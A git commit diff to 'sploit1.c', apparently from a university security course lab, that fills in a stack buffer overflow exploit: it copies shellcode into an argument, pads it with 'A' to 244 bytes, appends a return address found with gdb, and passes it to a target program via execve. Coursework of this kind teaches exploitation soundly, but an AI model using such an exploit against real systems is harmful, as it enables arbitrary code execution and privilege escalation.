3d760342f2f682a6f240c11d1d1962d9c9dc9f0b
Evann Courdier <evann.courdier@epfl.ch>
2021-10-13 17:01:41 +0200

    Update sploit1.c

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -10,8 +10,27 @@ int main(void)
 {
   char *args[3];
   char *env[1];
+  char address[4] = { 0x68, 0xfc, 0xff, 0xbf };
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  args[0] = TARGET;
+  args[1] = (char *) malloc(248);
+
+  int i;
+  int scl = strlen(shellcode);
+
+  // Inject shell code
+  for (i = 0; i < scl; i++)
+    args[1][i] = shellcode[i];
+
+  // Pad with many A
+  for (i = scl; i < 244; i++)
+    args[1][i] = 'A';
+
+  // Add the return address found with gdb
+  for (i = 0; i < 4; i++)
+    args[1][244 + i] = address[i];
+
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
